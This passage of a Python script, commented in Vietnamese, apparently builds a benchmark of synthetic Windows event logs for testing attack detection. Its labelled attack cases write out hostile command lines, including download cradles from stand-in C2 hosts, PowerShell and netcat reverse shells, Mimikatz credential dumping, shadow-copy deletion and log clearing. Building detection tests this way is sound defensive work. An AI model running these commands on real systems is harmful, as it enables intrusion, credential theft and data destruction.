"""
Bộ sinh Dữ liệu Đánh giá Chuẩn mực Quy mô Lớn: 600 Ca Kiểm thử Toàn diện
- Bài 1 (Atomic & Signatures): Đúng 200 ca (50 Attack + 150 Normal)
- Bài 2 (Multi-stage & LotL Correlation): Đúng 200 ca (50 Attack + 150 Normal)
- Bài 3 (Accidental Mistakes & Hard Negatives): Đúng 200 ca (50 Attack + 150 Normal)
Tổng cộng: 600 ca độc lập (150 Attack / 25.0% + 450 Benign / 75.0%)
"""
import csv
import json
import os
import shutil
import sys
from datetime import datetime, timedelta
from pathlib import Path

# UTF-8 cho Windows console
if sys.stdout and hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8")
if sys.stderr and hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8")

BASE = Path(__file__).resolve().parent.parent  # thư mục gốc winlog-agent (file này ở core/)
BENCH_DIR = BASE / "data_benchmark"

XML_HEADER = "<Events>"
XML_FOOTER = "</Events>"


def format_win_time(dt: datetime) -> str:
    return dt.strftime("%Y-%m-%dT%H:%M:%S.0000000Z")


def create_security_event_xml(
    event_id: int,
    time_str: str,
    record_id: int,
    data_dict: dict,
    computer: str = "WORKSTATION-SOC.corp.local",
) -> str:
    defaults = {
        "SubjectUserSid": "S-1-5-21-3686947128-2095841011-3536572084-1001",
        "SubjectUserName": "-",
        "SubjectDomainName": "CORP",
        "SubjectLogonId": "0x3e7",
        "TargetUserSid": "S-1-5-21-3686947128-2095841011-3536572084-1002",
        "TargetUserName": "-",
        "TargetDomainName": "CORP",
        "TargetLogonId": "0x0",
        "LogonType": "2",
        "IpAddress": "-",
        "WorkstationName": "WORKSTATION-SOC",
        "Status": "0x0",
        "SubStatus": "0x0",
        "ProcessId": "0x4",
        "NewProcessId": "0x1200",
        "NewProcessName": "",
        "CommandLine": "",
        "ParentProcessName": "C:\\Windows\\System32\\explorer.exe",
    }
    merged = {**defaults, **data_dict}
    data_items = "".join([f"<Data Name='{k}'>{merged[k]}</Data>" for k in merged if merged[k] != ""])
    return (
        f"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
        f"<System>"
        f"<Provider Name='Microsoft-Windows-Security-Auditing' Guid='{{54849625-5478-4994-A5BA-3E3B0328C30D}}'/>"
        f"<EventID>{event_id}</EventID>"
        f"<Version>2</Version>"
        f"<Level>0</Level>"
        f"<Task>12544</Task>"
        f"<Opcode>0</Opcode>"
        f"<Keywords>0x8020000000000000</Keywords>"
        f"<TimeCreated SystemTime='{time_str}'/>"
        f"<EventRecordID>{record_id}</EventRecordID>"
        f"<Correlation/>"
        f"<Execution ProcessID='4' ThreadID='204'/>"
        f"<Channel>Security</Channel>"
        f"<Computer>{computer}</Computer>"
        f"<Security/>"
        f"</System>"
        f"<EventData>{data_items}</EventData>"
        f"</Event>"
    )


def create_powershell_event_xml(
    script_text: str,
    time_str: str,
    record_id: int,
    computer: str = "WORKSTATION-SOC.corp.local",
) -> str:
    escaped_text = (
        script_text.replace("&", "&amp;")
        .replace("<", "&lt;")
        .replace(">", "&gt;")
        .replace("'", "&apos;")
        .replace('"', "&quot;")
    )
    return (
        f"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'>"
        f"<System>"
        f"<Provider Name='Microsoft-Windows-PowerShell' Guid='{{A0C1853B-5C40-4B15-8766-3CF1C58F985A}}'/>"
        f"<EventID>4104</EventID>"
        f"<Version>1</Version>"
        f"<Level>3</Level>"
        f"<Task>2</Task>"
        f"<Opcode>15</Opcode>"
        f"<Keywords>0x0</Keywords>"
        f"<TimeCreated SystemTime='{time_str}'/>"
        f"<EventRecordID>{record_id}</EventRecordID>"
        f"<Correlation/>"
        f"<Execution ProcessID='4388' ThreadID='6892'/>"
        f"<Channel>Microsoft-Windows-PowerShell/Operational</Channel>"
        f"<Computer>{computer}</Computer>"
        f"<Security/>"
        f"</System>"
        f"<EventData>"
        f"<Data Name='MessageNumber'>1</Data>"
        f"<Data Name='MessageTotal'>1</Data>"
        f"<Data Name='ScriptBlockText'>{escaped_text}</Data>"
        f"<Data Name='ScriptBlockId'>5b271d50-1361-460b-a197-0123456789ab</Data>"
        f"</EventData>"
        f"</Event>"
    )


def write_case(target_dir: Path, case_id: str, category: str, ground_truth: str, desc: str, mitre: str, scenario_name: str, sec_events: list, ps_events: list):
    case_folder = target_dir / case_id
    case_folder.mkdir(parents=True, exist_ok=True)

    sec_xml = XML_HEADER + "\n" + "\n".join(sec_events) + "\n" + XML_FOOTER
    ps_xml = XML_HEADER + "\n" + "\n".join(ps_events) + "\n" + XML_FOOTER

    (case_folder / "security.xml").write_text(sec_xml, encoding="utf-8")
    (case_folder / "powershell.xml").write_text(ps_xml, encoding="utf-8")

    manifest = {
        "case_id": case_id,
        "category": category,
        "ground_truth": ground_truth,
        "description": desc,
        "mitre_technique": mitre,
        "scenario": scenario_name,
        "generated_at": datetime.now().isoformat(),
    }
    (case_folder / "manifest.json").write_text(json.dumps(manifest, ensure_ascii=False, indent=2), encoding="utf-8")
    return manifest


# ==============================================================================
# BÀI 1: TỪNG SỰ KIỆN ĐƠN LẺ & CHỮ KÝ TĨNH (Atomic & Signatures) - 200 CA
# ==============================================================================
def build_scenario_1():
    target = BENCH_DIR / "bai_1_chu_ky_tinh"
    target.mkdir(parents=True, exist_ok=True)
    base_time = datetime(2026, 10, 26, 8, 0, 0)
    manifests = []

    attack_defs = [
        ("case_b1_att_01_mimikatz_sekurlsa", "CredentialAccess", "Mimikatz: Trích xuất mật khẩu rõ từ LSASS qua sekurlsa::logonpasswords.", "T1003.001",
         [{"SubjectUserName": "attacker", "CommandLine": "powershell.exe -c \"Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'\""}],
         ["Invoke-Mimikatz -Command 'privilege::debug sekurlsa::logonpasswords'"]),
        ("case_b1_att_02_procdump_lsass", "CredentialAccess", "Procdump: Dump bộ nhớ LSASS ra file dmp để trích xuất offline.", "T1003.001",
         [{"SubjectUserName": "attacker", "CommandLine": "procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp"}], []),
        ("case_b1_att_03_powershell_encoded_c2", "Execution", "PowerShell Encoded Command: Thực thi lệnh nén Base64 ẩn danh.", "T1059.001",
         [{"SubjectUserName": "attacker", "CommandLine": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwAyAC4AeAB5AHoALwBiAC4AcABzADEAJwApAA=="}],
         ["IEX (New-Object Net.WebClient).DownloadString('http://c2.xyz/b.ps1')"]),
        ("case_b1_att_04_disable_windefend", "DefenseEvasion", "Vô hiệu hóa tính năng giám sát thời gian thực của Windows Defender.", "T1562.001",
         [{"SubjectUserName": "attacker", "CommandLine": "powershell.exe -Command Set-MpPreference -DisableRealtimeMonitoring $true"}],
         ["Set-MpPreference -DisableRealtimeMonitoring $true"]),
        ("case_b1_att_05_clear_security_log", "DefenseEvasion", "Xóa sạch toàn bộ nhật ký sự kiện Security qua wevtutil.", "T1070.001",
         [{"SubjectUserName": "attacker", "CommandLine": "wevtutil.exe cl Security"}], []),
        ("case_b1_att_06_kerberoasting_spn", "CredentialAccess", "Kerberoasting: Yêu cầu vé TGS SPN để bẻ khóa mật khẩu offline.", "T1558.003",
         [{"SubjectUserName": "attacker", "CommandLine": "powershell.exe -c \"Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/db01.corp.local:1433'\""}],
         ["New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/db01.corp.local:1433'"]),
        ("case_b1_att_07_pass_the_hash_cmd", "LateralMovement", "Pass-The-Hash: Thực thi Mimikatz sekurlsa::pth mở phiên dòng lệnh mới.", "T1550.002",
         [{"SubjectUserName": "attacker", "CommandLine": "powershell.exe -c \"sekurlsa::pth /user:Administrator /domain:CORP /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:cmd.exe\""}],
         ["sekurlsa::pth /user:Administrator /domain:CORP /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0 /run:cmd.exe"]),
        ("case_b1_att_08_vssadmin_delete_shadows", "Impact", "Ransomware: Xóa toàn bộ bản sao lưu Shadow Copies phục hồi hệ thống.", "T1490",
         [{"SubjectUserName": "attacker", "CommandLine": "vssadmin.exe delete shadows /all /quiet"}], []),
        ("case_b1_att_09_certutil_decode_exec", "DefenseEvasion", "Certutil Decode: Giải mã tệp văn bản Base64 thành payload thực thi exe.", "T1140",
         [{"SubjectUserName": "attacker", "CommandLine": "certutil.exe -decode C:\\Users\\Public\\update.txt C:\\Users\\Public\\payload.exe"}], []),
        ("case_b1_att_10_reg_save_sam_system", "CredentialAccess", "Dump Hive SAM và SYSTEM nhằm trích xuất NTLM hash cục bộ.", "T1003.002",
         [{"SubjectUserName": "attacker", "CommandLine": "reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.save /y"},
          {"SubjectUserName": "attacker", "CommandLine": "reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save /y"}], []),
        ("case_b1_att_11_vaultcmd_theft", "CredentialAccess", "Thu thập danh sách chứng thư lưu trong Windows Credential Manager.", "T1555.004",
         [{"SubjectUserName": "attacker", "CommandLine": "vaultcmd.exe /listcreds:\"Windows Credentials\""}], []),
        ("case_b1_att_12_bitsadmin_download", "Persistence", "BITSAdmin: Tạo job tải payload mã độc ngầm dưới nền hệ điều hành.", "T1197",
         [{"SubjectUserName": "attacker", "CommandLine": "bitsadmin.exe /transfer backdoorJob /download /priority foreground http://c2.biz/malware.exe C:\\Users\\Public\\malware.exe"}], []),
        ("case_b1_att_13_curl_drop_exec", "Execution", "cURL Drop & Exec: Tải mã độc từ server điều khiển và kích hoạt ngầm.", "T1105",
         [{"SubjectUserName": "attacker", "CommandLine": "curl.exe -s -k -o C:\\Users\\Public\\agent.exe http://194.165.16.8/agent.exe"},
          {"SubjectUserName": "attacker", "CommandLine": "cmd.exe /c start /b C:\\Users\\Public\\agent.exe"}], []),
        ("case_b1_att_14_cipher_wipe_slack", "Impact", "Cipher Wipe: Tiêu hủy dữ liệu ổ đĩa bằng tiện ích cipher /w ghi đè vùng trống.", "T1485",
         [{"SubjectUserName": "attacker", "CommandLine": "cipher.exe /w:C:\\Users\\victim\\Documents"}], []),
        ("case_b1_att_15_reg_save_lsa_secrets", "CredentialAccess", "Trích xuất LSA Secrets nội bộ từ khóa Registry SECURITY.", "T1003.002",
         [{"SubjectUserName": "attacker", "CommandLine": "reg.exe save HKLM\\SECURITY C:\\Windows\\Temp\\security.save /y"}], []),
        ("case_b1_att_16_rubeus_asktgt", "CredentialAccess", "Rubeus: Yêu cầu Kerberos TGT ticket trực tiếp từ Domain Controller.", "T1558.003",
         [{"SubjectUserName": "attacker", "CommandLine": "Rubeus.exe asktgt /user:Administrator /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /nowrap"}], []),
        ("case_b1_att_17_lazagne_all_passwords", "CredentialAccess", "LaZagne: Tự động vét toàn bộ mật khẩu trình duyệt, Wi-Fi và hệ thống.", "T1555",
         [{"SubjectUserName": "attacker", "CommandLine": "laZagne.exe all -oN"}], []),
        ("case_b1_att_18_net_user_backdoor_add", "Persistence", "Tạo tài khoản quản trị bí mật net user hacker /add.", "T1136.001",
         [{"SubjectUserName": "attacker", "CommandLine": "net.exe user hacker P@ssw0rd999! /add"},
          {"SubjectUserName": "attacker", "CommandLine": "net.exe localgroup Administrators hacker /add"}], []),
        ("case_b1_att_19_reg_add_run_persistence", "Persistence", "Tạo khóa khởi động cùng hệ thống tại HKCU Run key.", "T1547.001",
         [{"SubjectUserName": "attacker", "CommandLine": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d \"C:\\Users\\Public\\svchost.exe\" /f"}], []),
        ("case_b1_att_20_schtasks_create_backdoor", "Persistence", "Tạo tác vụ lập lịch Schtasks kích hoạt mã độc định kỳ 10 phút.", "T1053.005",
         [{"SubjectUserName": "attacker", "CommandLine": "schtasks.exe /create /tn \"SecurityHealthUpdate\" /tr \"C:\\Users\\Public\\nc.exe 10.0.0.1 4444 -e cmd.exe\" /sc minute /mo 10 /ru SYSTEM"}], []),
        ("case_b1_att_21_wmic_shadowcopy_delete", "Impact", "Xóa Shadow Copies bằng tiện ích dòng lệnh WMIC.", "T1490",
         [{"SubjectUserName": "attacker", "CommandLine": "wmic.exe shadowcopy delete /nointeractive"}], []),
        ("case_b1_att_22_wbadmin_delete_catalog", "Impact", "Xóa Catalog sao lưu hệ thống bằng lệnh wbadmin.", "T1490",
         [{"SubjectUserName": "attacker", "CommandLine": "wbadmin.exe delete catalog -quiet"}], []),
        ("case_b1_att_23_fsutil_usn_deletejournal", "DefenseEvasion", "Xóa nhật ký thay đổi tệp tin NTFS USN Journal để xóa dấu vết điều tra.", "T1070",
         [{"SubjectUserName": "attacker", "CommandLine": "fsutil.exe usn deletejournal /D C:"}], []),
        ("case_b1_att_24_bcdedit_recovery_disable", "Impact", "Vô hiệu hóa tính năng tự sửa lỗi Windows Recovery trong BCD.", "T1490",
         [{"SubjectUserName": "attacker", "CommandLine": "bcdedit.exe /set {default} recoveryenabled No"},
          {"SubjectUserName": "attacker", "CommandLine": "bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures"}], []),
        ("case_b1_att_25_attrib_hide_executable", "DefenseEvasion", "Ẩn giấu tệp mã độc bằng thuộc tính System và Hidden qua attrib +h +s.", "T1564.001",
         [{"SubjectUserName": "attacker", "CommandLine": "attrib.exe +h +s +r C:\\Users\\Public\\svchost.exe"}], []),
        ("case_b1_att_26_icacls_deny_admin", "DefenseEvasion", "Chặn quyền truy cập của Quản trị viên vào thư mục mã độc bằng icacls deny.", "T1222.001",
         [{"SubjectUserName": "attacker", "CommandLine": "icacls.exe \"C:\\Users\\Public\\svchost.exe\" /deny \"Administrators\":(F)"}], []),
        ("case_b1_att_27_net_stop_windefend", "DefenseEvasion", "Dừng dịch vụ bảo vệ Microsoft Defender Antivirus bằng net stop.", "T1562.001",
         [{"SubjectUserName": "attacker", "CommandLine": "net.exe stop WinDefend /y"}], []),
        ("case_b1_att_28_fltmc_unload_sysmon", "DefenseEvasion", "Gỡ driver giám sát Sysmon khỏi bộ nhớ qua fltmc unload.", "T1562.001",
         [{"SubjectUserName": "attacker", "CommandLine": "fltmc.exe unload SysmonDrv"}], []),
        ("case_b1_att_29_sc_stop_wuauserv", "DefenseEvasion", "Dừng và vô hiệu hóa dịch vụ cập nhật vá lỗi Windows Update.", "T1562.001",
         [{"SubjectUserName": "attacker", "CommandLine": "sc.exe config wuauserv start= disabled"},
          {"SubjectUserName": "attacker", "CommandLine": "net.exe stop wuauserv /y"}], []),
        ("case_b1_att_30_netsh_firewall_disable", "DefenseEvasion", "Tắt toàn bộ tường lửa Windows Firewall qua lệnh netsh advfirewall.", "T1562.004",
         [{"SubjectUserName": "attacker", "CommandLine": "netsh.exe advfirewall set allprofiles state off"}], []),
        ("case_b1_att_31_takeown_system_file", "DefenseEvasion", "Chiếm quyền sở hữu tệp tin hệ thống nhạy cảm bằng takeown /f.", "T1222.001",
         [{"SubjectUserName": "attacker", "CommandLine": "takeown.exe /f C:\\Windows\\System32\\cmd.exe /a"}], []),
        ("case_b1_att_32_powershell_iex_download", "Execution", "PowerShell IEX WebClient Download Cradle trực tiếp từ IP lạ.", "T1059.001",
         [{"SubjectUserName": "attacker", "CommandLine": "powershell.exe -w hidden -c (New-Object Net.WebClient).DownloadString('http://45.33.32.156/stage.ps1')"}],
         ["(New-Object Net.WebClient).DownloadString('http://45.33.32.156/stage.ps1')"]),
        ("case_b1_att_33_certutil_urlcache_download", "Execution", "Lợi dụng certutil urlcache để tải binary độc từ server C2.", "T1105",
         [{"SubjectUserName": "attacker", "CommandLine": "certutil.exe -urlcache -split -f http://evil-c2.net/beacon.exe C:\\Users\\Public\\beacon.exe"}], []),
        ("case_b1_att_34_rundll32_advpack_inf", "DefenseEvasion", "LOLBAS: Thực thi tệp INF độc hại bằng rundll32 gọi advpack.dll.", "T1218.011",
         [{"SubjectUserName": "attacker", "CommandLine": "rundll32.exe advpack.dll,LaunchINFSection C:\\Users\\Public\\payload.inf,DefaultInstall_SingleUser,1,"}], []),
        ("case_b1_att_35_regsvr32_scrobj_sct", "DefenseEvasion", "Tấn công Squiblydoo thực thi scriptlet SCT từ xa qua regsvr32.", "T1218.010",
         [{"SubjectUserName": "attacker", "CommandLine": "regsvr32.exe /s /n /u /i:http://evil-c2.net/backdoor.sct scrobj.dll"}], []),
        ("case_b1_att_36_mshta_inline_vbscript", "Execution", "Thực thi mã độc VBScript trực tiếp trong bộ nhớ qua mshta.exe.", "T1218.005",
         [{"SubjectUserName": "attacker", "CommandLine": "mshta.exe vbscript:Close(Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell.exe -w hidden -c (New-Object Net.WebClient).DownloadString('http://threat.org/stage1.ps1')\"\",0))\")"}], []),
        ("case_b1_att_37_powersploit_portscan", "Discovery", "Thực thi module PowerSploit Invoke-Portscan quét dải mạng LAN.", "T1046",
         [{"SubjectUserName": "attacker", "CommandLine": "powershell.exe -c \"Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -TopPorts 50\""}],
         ["Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -TopPorts 50"]),
        ("case_b1_att_38_wmic_process_create_cmd", "Execution", "Khởi tạo tiến trình độc ngầm qua wmic process call create.", "T1047",
         [{"SubjectUserName": "attacker", "CommandLine": "wmic.exe process call create \"cmd.exe /c powershell.exe -w hidden (New-Object Net.WebClient).DownloadString('http://c2.biz/run.ps1')\""}], []),
        ("case_b1_att_39_pwdump7_extract", "CredentialAccess", "Pwdump7: Trích xuất trực tiếp mật khẩu băm từ SAM.", "T1003.002",
         [{"SubjectUserName": "attacker", "CommandLine": "pwdump7.exe -d"}], []),
        ("case_b1_att_40_secretsdump_remote", "CredentialAccess", "Impacket secretsdump: Trích xuất LSA secrets và cached domain credentials.", "T1003.004",
         [{"SubjectUserName": "attacker", "CommandLine": "secretsdump.py CORP/admin:Pass123@192.168.1.10 -just-dc"}], []),
        ("case_b1_att_41_crackmapexec_exec", "LateralMovement", "CrackMapExec: Quét xác thực SMB và thực thi lệnh từ xa.", "T1021.002",
         [{"SubjectUserName": "attacker", "CommandLine": "crackmapexec smb 192.168.1.0/24 -u administrator -p P@ss123 -x \"whoami\""}], []),
        ("case_b1_att_42_sharpup_audit", "PrivilegeEscalation", "SharpUp: Quét lỗ hổng cấu hình dịch vụ để leo thang đặc quyền.", "T1068",
         [{"SubjectUserName": "attacker", "CommandLine": "SharpUp.exe audit"}], []),
        ("case_b1_att_43_winpeas_enum", "Discovery", "WinPEAS: Quét tự động leo thang đặc quyền toàn diện hệ thống Windows.", "T1082",
         [{"SubjectUserName": "attacker", "CommandLine": "winPEASany.exe quiet cmd fast"}], []),
        ("case_b1_att_44_wsl_linpeas_exec", "DefenseEvasion", "Lợi dụng môi trường máy ảo WSL để chạy script độc linpeas.sh.", "T1202",
         [{"SubjectUserName": "attacker", "CommandLine": "wsl.exe -d Ubuntu -e bash -c \"curl -s http://evil.com/linpeas.sh | sh\""}], []),
        ("case_b1_att_45_cobaltstrike_beacon_spawn", "Execution", "CobaltStrike: Khởi tạo tiến trình Beacon ngầm từ rundll32.", "T1059.001",
         [{"SubjectUserName": "attacker", "CommandLine": "rundll32.exe C:\\Users\\Public\\beacon.dll,StartW"}], []),
        ("case_b1_att_46_empire_stager_launch", "Execution", "PowerShell Empire: Nạp stager độc hại bằng scriptlet base64.", "T1059.001",
         [{"SubjectUserName": "attacker", "CommandLine": "powershell.exe -noP -sta -w 1 -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgALABbAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAo..."}],
         ["[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; $wc = New-Object System.Net.WebClient; IEX $wc.DownloadString('http://empire.c2/launcher');"]),
        ("case_b1_att_47_metasploit_rev_tcp", "Execution", "Metasploit: Thực thi reverse TCP meterpreter payload trong powershell.", "T1059.001",
         [{"SubjectUserName": "attacker", "CommandLine": "powershell.exe -nop -c \"$c=New-Object System.Net.Sockets.TCPClient('192.168.1.50',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb + 'PS ' + (pwd).Path + '> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()\""}],
         ["$c=New-Object System.Net.Sockets.TCPClient('192.168.1.50',4444); $s=$c.GetStream(); iex (New-Object System.Text.ASCIIEncoding).GetString($b,0,$i)"]),
        ("case_b1_att_48_mimikatz_sekurlsa_tickets", "CredentialAccess", "Mimikatz: Trích xuất toàn bộ vé Kerberos TGT/TGS trong RAM.", "T1003.001",
         [{"SubjectUserName": "attacker", "CommandLine": "powershell.exe -c \"Invoke-Mimikatz -Command 'sekurlsa::tickets /export'\""}],
         ["Invoke-Mimikatz -Command 'sekurlsa::tickets /export'"]),
        ("case_b1_att_49_powersploit_mimikatz_dump", "CredentialAccess", "Nạp reflective DLL Mimikatz trực tiếp vào bộ nhớ powershell.", "T1003.001",
         [{"SubjectUserName": "attacker", "CommandLine": "powershell.exe -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://threat.net/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\""}],
         ["IEX (New-Object Net.WebClient).DownloadString('http://threat.net/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"]),
        ("case_b1_att_50_wevtutil_clear_system", "DefenseEvasion", "Xóa nhật ký sự kiện System và Application bằng wevtutil.", "T1070.001",
         [{"SubjectUserName": "attacker", "CommandLine": "wevtutil.exe cl System"},
          {"SubjectUserName": "attacker", "CommandLine": "wevtutil.exe cl Application"}], []),
    ]

    for cid, cat, desc, mitre, sec_cmds, ps_scripts in attack_defs:
        sec = []
        rec = 1000
        for cmd_dict in sec_cmds:
            rec += 1
            sec.append(create_security_event_xml(4688, format_win_time(base_time), rec, cmd_dict))
        ps = []
        for s in ps_scripts:
            rec += 1
            ps.append(create_powershell_event_xml(s, format_win_time(base_time), rec))
        manifests.append(write_case(target, cid, cat, "ALERT", desc, mitre, "Bài 1", sec, ps))

    # 150 Benign Cases
    benign_templates = [
        ("word_open", "Mở Microsoft Word soạn thảo tài liệu nội bộ.", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"),
        ("excel_calc", "Mở bảng tính Microsoft Excel xử lý báo cáo tài chính.", "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE"),
        ("powerpoint_slide", "Trình chiếu slide thuyết trình Microsoft PowerPoint.", "C:\\Program Files\\Microsoft Office\\root\\Office16\\POWERPNT.EXE"),
        ("outlook_mail", "Khởi chạy Microsoft Outlook đọc và phản hồi email.", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"),
        ("chrome_web", "Duyệt web tra cứu tài liệu học tập bằng Google Chrome.", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --profile-directory=Default"),
        ("edge_intranet", "Truy cập cổng thông tin nội bộ công ty bằng Microsoft Edge.", "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe http://intranet.corp.local"),
        ("acrobat_pdf", "Mở tài liệu hợp đồng định dạng PDF bằng Adobe Acrobat Reader.", "C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe"),
        ("teams_chat", "Đăng nhập và gửi tin nhắn trao đổi công việc trên Microsoft Teams.", "C:\\Users\\user\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"),
        ("zoom_join", "Tham gia cuộc họp trực tuyến phòng ban bằng ứng dụng Zoom.", "C:\\Users\\user\\AppData\\Roaming\\Zoom\\bin\\Zoom.exe --url=zoommtg://..."),
        ("notepad_note", "Mở Notepad ghi chép nhanh thông tin công việc hàng ngày.", "notepad.exe C:\\Users\\user\\Desktop\\notes.txt"),
        ("calc_tool", "Sử dụng tiện ích Calculator tính toán số liệu văn phòng.", "calculator.exe"),
        ("paint_draw", "Mở công cụ Paint chỉnh sửa ảnh chụp màn hình báo cáo.", "mspaint.exe C:\\Users\\user\\Pictures\\screenshot.png"),
        ("cmd_dir", "Liệt kê danh sách tập tin trong thư mục Documents.", "cmd.exe /c dir C:\\Users\\user\\Documents"),
        ("cmd_ipconfig", "Kiểm tra địa chỉ IP cấu hình card mạng máy tính cá nhân.", "ipconfig.exe /all"),
        ("cmd_ping_gateway", "Kiểm tra kết nối mạng nội bộ tới Default Gateway.", "ping.exe -n 4 192.168.1.1"),
        ("cmd_hostname", "Xem tên định danh máy trạm trong mạng nội bộ.", "hostname.exe"),
        ("cmd_whoami", "Kiểm tra tên tài khoản người dùng đang đăng nhập hiện tại.", "whoami.exe"),
        ("cmd_systeminfo", "Xuất thông tin cấu hình phần cứng và phiên bản Windows.", "systeminfo.exe"),
        ("cmd_netstat_active", "Xem danh sách các cổng kết nối TCP đang mở hợp lệ.", "netstat.exe -ano"),
        ("cmd_route_lan", "Kiểm tra bảng định tuyến mạng máy trạm.", "route.exe print"),
        ("cmd_arp_table", "Xem bảng ánh xạ địa chỉ IP và MAC Address mạng LAN.", "arp.exe -a"),
        ("cmd_nslookup_dns", "Truy vấn địa chỉ máy chủ DNS nội bộ domain công ty.", "nslookup.exe corp.local"),
        ("cmd_tasklist_sys", "Liệt kê danh sách các tiến trình dịch vụ đang hoạt động.", "tasklist.exe /svc"),
        ("cmd_chkdsk_verify", "Kiểm tra tính toàn vẹn hệ thống tập tin NTFS phân vùng C:.", "chkdsk.exe C:"),
        ("cmd_dism_health", "Kiểm tra sức khỏe kho ảnh hệ thống Windows DISM.", "dism.exe /online /cleanup-image /checkhealth"),
        ("cmd_sfc_verify", "Quét kiểm tra chữ ký số các tệp tin hệ thống Windows.", "sfc.exe /verifyonly"),
        ("cmd_gpupdate", "Cập nhật chính sách người dùng từ Active Directory.", "gpupdate.exe /target:user"),
        ("cmd_robocopy_docs", "Sao chép đồng bộ tài liệu sang ổ đĩa sao lưu ngoài.", "robocopy.exe C:\\Users\\user\\Documents D:\\Backup /E /XO"),
        ("ps_get_process", "Lấy danh sách các tiến trình chiếm dụng CPU hàng đầu.", "powershell.exe -c Get-Process | Sort-Object CPU -Descending | Select-Object -First 10"),
        ("ps_get_service", "Kiểm tra trạng thái hoạt động của dịch vụ Print Spooler.", "powershell.exe -c Get-Service -Name Spooler"),
        ("ps_get_date", "Lấy ngày giờ hiện tại định dạng chuẩn theo múi giờ máy trạm.", "powershell.exe -c Get-Date -Format 'yyyy-MM-dd HH:mm:ss'"),
        ("ps_get_hotfix", "Kiểm tra danh sách các gói cập nhật bảo mật KB đã cài đặt.", "powershell.exe -c Get-HotFix | Sort-Object InstalledOn -Descending"),
        ("ps_compress_zip", "Nén thư mục báo cáo cuối tháng thành tệp tin zip.", "powershell.exe -c Compress-Archive -Path C:\\Reports -DestinationPath C:\\Reports.zip"),
        ("ps_test_connection", "Kiểm tra kết nối cổng web nội bộ port 443 máy chủ ERP.", "powershell.exe -c Test-NetConnection -ComputerName erp.corp.local -Port 443"),
        ("ps_get_disk", "Kiểm tra dung lượng trống trên các ổ đĩa cứng máy trạm.", "powershell.exe -c Get-Disk | Get-Partition | Get-Volume"),
        ("ps_get_eventlog_system", "Xem 5 sự kiện nhật ký gần nhất trong System Event Log.", "powershell.exe -c Get-EventLog -LogName System -Newest 5"),
        ("git_status", "Kiểm tra trạng thái các tệp tin mã nguồn trong kho Git.", "git.exe status"),
        ("git_pull_main", "Cập nhật mã nguồn mới nhất từ nhánh chính trên GitHub.", "git.exe pull origin main"),
        ("git_branch_list", "Xem danh sách các nhánh tính năng đang phát triển cục bộ.", "git.exe branch -a"),
        ("node_version", "Kiểm tra phiên bản môi trường Node.js và npm cài đặt.", "node.exe -v"),
        ("python_version", "Kiểm tra phiên bản trình thông dịch Python trong máy tính.", "python.exe --version"),
        ("pip_list", "Xem danh sách các thư viện Python cài đặt trong môi trường ảo.", "pip.exe list"),
        ("vscode_editor", "Khởi chạy trình soạn thảo mã nguồn Visual Studio Code.", "code.exe C:\\Projects\\MyProject"),
        ("docker_ps", "Xem danh sách các container Docker đang hoạt động cục bộ.", "docker.exe ps"),
        ("kubectl_pods", "Kiểm tra trạng thái các Pods trong cụm Kubernetes phát triển.", "kubectl.exe get pods -n dev"),
        ("mvn_clean", "Dọn dẹp tệp tin tạm và biên dịch dự án Java Maven.", "mvn.cmd clean compile"),
        ("cargo_build", "Biên dịch dự án ngôn ngữ lập trình Rust release mode.", "cargo.exe build --release"),
        ("go_build", "Biên dịch mã nguồn ứng dụng Golang thành tệp nhị phân.", "go.exe build main.go"),
        ("dotnet_run", "Chạy thử nghiệm dịch vụ web API nền tảng ASP.NET Core.", "dotnet.exe run --project WebApi"),
